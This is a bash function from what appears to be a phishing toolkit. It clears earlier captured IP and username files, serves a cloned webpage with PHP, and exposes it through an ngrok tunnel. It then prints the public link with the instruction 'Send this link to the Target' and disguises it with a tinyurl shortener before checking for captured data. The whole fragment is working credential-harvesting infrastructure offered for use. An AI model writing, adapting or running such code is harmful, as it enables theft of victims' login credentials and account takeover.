
ngrok() {
    if [[ -e ../../webpages/$server/ip.txt ]]; then
        rm -rf ../../webpages/$server/ip.txt
    fi
        if [[ -e ../../webpages/$server/usernames.txt ]]; then
            rm -rf ../../webpages/$server/usernames.txt
        fi
            printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
            cd ../../webpages/$server && php -S 127.0.0.1:3333 > /dev/null 2>&1 &
            sleep 2
            printf "\e[1;92m[\e[0m*\e[1;92m] Starting ngrok server...\n"
            ./ngrok http 3333 > /dev/null 2>&1 &
            sleep 4
            
# Don't mess with the regex, bitchy boring thing to do

            link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
            printf "\e[1;92m[\e[0m*\e[1;92m] Send this link to the Target:\e[0m\e[1;77m %s\e[0m\n" $link
            send_ip=$(curl -s "http://tinyurl.com/api-create.php?url=$link" | head -n1)
# send_ip=$(curl -s http://tinyurl.com/api-create.php?url=$send_link | head -n1)
            printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Or using tinyurl:\e[0m\e[1;77m %s \n' $send_ip
            printf "\n"
            checkfound
}
